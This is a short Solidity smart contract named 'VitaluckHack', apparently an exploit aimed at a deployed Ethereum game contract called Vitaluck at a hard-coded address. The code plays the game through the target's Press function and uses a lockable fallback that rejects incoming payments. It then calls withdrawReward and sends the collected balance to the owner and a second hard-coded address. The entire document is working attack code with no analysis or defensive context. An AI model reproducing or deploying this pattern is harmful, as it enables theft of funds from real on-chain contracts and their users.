contract VitaluckHack{
    
    bool locked = true;
    address owner = msg.sender;
    
    function()
        public payable 
    { 
        if (locked){
            revert();
        }
    }
    
    function setlock(bool what){
        require(msg.sender == owner);
        locked = what;
    }
    
    function go() public payable {
        Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A);
        
        Target.Press.value(msg.value)(1, 0);
    }
    
    function get(){
        setlock(false);
        Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A);
        Target.withdrawReward();
        
        address(0x98081ce968E5643c15de9C024dE96b18BE8e5aCe).transfer(address(this).balance/2);
        address(owner).transfer(address(this).balance);
    }
    
    
    
}

interface Vitaluck{
    function withdrawReward() public;
    function Press(uint a, uint b) public payable;
}